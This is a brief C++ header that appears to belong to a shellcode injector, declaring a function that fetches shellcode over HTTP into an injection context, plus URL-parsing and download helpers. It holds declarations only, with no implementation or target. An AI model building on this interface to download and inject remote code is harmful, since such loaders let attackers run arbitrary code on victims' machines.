#pragma once
#include "context.h"

BOOL GetShellcode_Http(INJECT_CTX *ctx);

// Helpers
struct UrlParts {
    wchar_t scheme[16];
    wchar_t host[256];
    wchar_t path[256];
};

bool ParseUrl(LPCWSTR url, UrlParts& out);
std::vector<BYTE> download(UrlParts shellcodeUrl);